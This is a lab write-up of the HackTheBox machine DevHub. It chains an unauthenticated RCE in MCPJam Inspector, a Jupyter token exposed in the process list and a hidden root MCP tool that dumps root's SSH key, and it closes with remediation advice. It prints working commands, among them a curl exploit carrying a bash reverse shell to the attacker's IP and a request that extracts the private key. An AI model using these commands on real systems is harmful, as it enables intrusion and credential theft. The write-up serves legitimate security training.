---
layout: default
title: DevHub
parent: HTB Writeups
nav_order: 2
---

# HTB DevHub

**Machine:** DevHub (Linux) · **Difficulty:** Medium · **Attack surface:** SSH (22), HTTP (80), MCPJam Inspector (6274)

DevHub is built around a single idea: every "internal" tool on this box trusts whatever is next to it on the network a little too much. A developer-facing debugging tool accepts commands from anyone who can reach it, a notebook server hands out its own password on the command line for any local user to read, and an internal automation server ships with a hardcoded key and a maintenance feature that was never meant to be reachable. None of the three steps is individually exotic — the interesting part is how directly one leads into the next.

---

## 1. Recon & Fingerprinting

A full nmap scan turns up three open ports: SSH (22), a web server on port 80, and something on port 6274.

```bash
nmap -p- --min-rate 2000 10.129.245.216
nmap -sCV -p 22,80,6274 10.129.245.216
```

| Port | Service |
|------|---------|
| 22 | OpenSSH 8.9p1 (Ubuntu 22.04) |
| 80 | nginx 1.18.0, redirects to `http://devhub.htb/` |
| 6274 | MCPJam Inspector 1.4.2 (Node single-page app, no login required) |

Port 80 redirects to a hostname rather than serving content directly, so that name needs to be added to `/etc/hosts` before anything on the site will load:

```
10.129.245.216  devhub.htb
```

### devhub.htb (port 80)

The landing page is a simple internal portal that advertises three services: an **MCP Inspector** (live, on port 6274), an **Analytics Dashboard** (described as a Jupyter notebook server, but only reachable from inside the machine on `localhost:8888`), and a **Code Repository** listed as being in maintenance mode. Of the three, only the Inspector is actually reachable from outside right now — which makes it the obvious starting point.

### MCPJam Inspector (port 6274)

MCPJam Inspector is a developer tool for testing **MCP** (Model Context Protocol) servers — the emerging standard that lets AI assistants call out to external tools. The version number, 1.4.2, is printed directly in the UI, and it sits inside the vulnerable range for a known, critical vulnerability.

---

## 2. Initial Foothold — CVE-2026-23744 (MCPJam Inspector pre-auth RCE)

MCPJam Inspector 1.4.2 and earlier ship with a `/api/mcp/connect` endpoint whose job is to launch a local MCP server process on the developer's behalf, based on a `command` and `args` the client sends it. The endpoint does this with no authentication and no validation of what it's being asked to run — and, by default, the Inspector listens on `0.0.0.0` instead of `127.0.0.1`, so that endpoint is reachable from the network, not just from the developer's own machine. The combination is tracked as **CVE-2026-23744**: an unauthenticated, no-interaction-required remote code execution vulnerability with a CVSS score of 9.8 (critical), patched in version 1.4.3.

In practice, that means any HTTP client can ask the Inspector to spawn an arbitrary process — including a shell — simply by supplying it as the "MCP server" to connect to:

```bash
# Listener
nc -lvnp 4444

# Exploit
curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.142/4444 0>&1"]
    }
  }'
```

This returns a shell as `mcp-dev`, a low-privilege service account that exists specifically to run the Inspector.

---

## 3. User — Jupyter Token via the Process List

The landing page mentioned a Jupyter-based analytics dashboard on `localhost:8888`, reachable only from inside the box. Since the current shell is already inside the box, the next step is getting eyes on that port.

### 3.1 Forward the internal Jupyter port

Jupyter is bound to loopback, so reaching it from outside means tunneling through the shell already obtained. chisel handles this: a server on the attacker's machine, and a client on the target that connects back and forwards the target's local port 8888 onto the attacker's machine.

```bash
# Kali
chisel server -p 8002 --reverse

# Target
wget http://10.10.15.142:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client 10.10.15.142:8002 R:8888:localhost:8888 &
```

### 3.2 Find the Jupyter token

Jupyter normally protects its own terminal and notebook access with a token, generated at startup and expected to be kept secret. Checking the running processes shows it wasn't kept very secret at all:

```bash
ps aux | grep jupyter
```

```
analyst  ... /home/analyst/jupyter-env/bin/python3 -m jupyter_server ... ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Because the token was passed as a command-line argument rather than read from a config file, it's visible to any local user who can list processes — in this case, `mcp-dev`, even though the Jupyter server itself runs as a different user, `analyst`.

### 3.3 Authenticate and get a shell

With the port forwarded and the token in hand, the dashboard is just a browser tab away:

```
http://localhost:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

JupyterLab includes a built-in terminal (File → New → Terminal) that opens a real shell as the account the server runs under — `analyst` — with no further exploitation needed.

```bash
cat ~/user.txt
```

**user.txt captured.**

---

## 4. Privilege Escalation — A Root-Owned MCP Server with a Hardcoded Key

### 4.1 Discover the OPSMCP server

With a shell as `analyst`, the next goal is privilege escalation: finding a flaw or misconfiguration that leads to full root access. Checking the running processes again turns up something owned by root:

```bash
ps aux
```

```
root    1087    /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Root is running a Flask MCP server on `localhost:5000`, and it's doing so using `analyst`'s own Python environment — a sign the two accounts' setups are more entangled than they should be.

### 4.2 Read the source

The server's source file, `/opt/opsmcp/server.py`, is world-readable:

```bash
cat /opt/opsmcp/server.py
```

Two things in it stand out immediately:

1. A hardcoded API key, `opsmcp_secret_key_4f5a6b7c8d9e0f1a`, used to authenticate requests to the server's own API.
2. A set of "hidden" tools that the server deliberately omits from its own `/tools/list` endpoint (the normal way an MCP client discovers what it can call) but will still execute if called directly by name. One of them, `ops._admin_dump`, takes a `target` argument and returns sensitive data depending on its value — and one of the valid targets, `ssh_keys`, reads `/root/.ssh/id_rsa` and returns it in the response.

### 4.3 Dump the root SSH key

Armed with the hardcoded key and the hidden tool's name, the private key is one request away:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

The response contains root's RSA private key, with newlines escaped as `\n` inside the JSON string.

### 4.4 SSH as root

```bash
printf '<key content with \n escapes>' > /tmp/root_id_rsa
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@10.129.245.216
cat /root/root.txt
```

**root.txt captured.**

---

## 5. Attack Chain Summary

```
nmap: 22 + 80 + 6274
   └─ MCPJam Inspector 1.4.2 on :6274
        └─ CVE-2026-23744 — unauthenticated remote code execution via /api/mcp/connect
             └─ shell as mcp-dev
                  └─ ps aux → Jupyter token in process arguments
                       └─ chisel tunnel → localhost:8888
                            └─ JupyterLab terminal → shell as analyst (user.txt)
                                 └─ ps aux → root running /opt/opsmcp/server.py on :5000
                                      └─ server.py → hardcoded API key + hidden ops._admin_dump tool
                                           └─ ops._admin_dump target=ssh_keys → root private key
                                                └─ root (root.txt)
```

---

## 6. Remediation

1. **Upgrade MCPJam Inspector off 1.4.2.** CVE-2026-23744 requires no login, is exploitable over the network with a single HTTP request, and carries a CVSS score of 9.8 — close to the maximum possible severity. Version 1.4.3 contains the fix.
2. **Bind developer tools to loopback, and put authentication in front of them anyway.** The Inspector listening on `0.0.0.0` by default is what let this vulnerability be reached remotely in the first place; even patched, a tool like this has no reason to be exposed beyond the developer's own machine.
3. **Never pass secrets as command-line arguments.** Jupyter's token was visible to every local user via `ps aux`. Tokens and passwords belong in a config file with restricted permissions, or in environment variables set by a process that doesn't expose its own invocation to other users on the box.
4. **Never hardcode API keys in source, and restrict who can read that source.** The OPSMCP server's key and its hidden admin tool were both discoverable the moment an unrelated, lower-privileged account could read `server.py`. Secrets belong outside the codebase, and files that contain them should be root-only readable when the service itself runs as root.
5. **Remove or properly gate credential-dump functionality.** A tool that can read and return `/root/.ssh/id_rsa` on request has no safe way to exist unauthenticated, hidden-from-discovery, or reachable by a service account that doesn't need it. If this kind of administrative function is genuinely required, it needs real authorization checks, not an API key shared by every caller on the box.
6. **Don't run internal tooling as root when it doesn't need to be.** OPSMCP had no apparent reason to run with root privileges; doing so turned a single logic flaw in a maintenance script into full system compromise.

---

*Flags obtained: user.txt (as `analyst`), root.txt (root via a hardcoded key in a root-owned MCP server). All actions performed against an authorized HackTheBox machine.*

Sources on CVE-2026-23744: [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-23744) · [Rapid7](https://www.rapid7.com/db/vulnerabilities/cve-2026-23744/) · [Mend.io](https://mend.io/vulnerability-database/CVE-2026-23744)
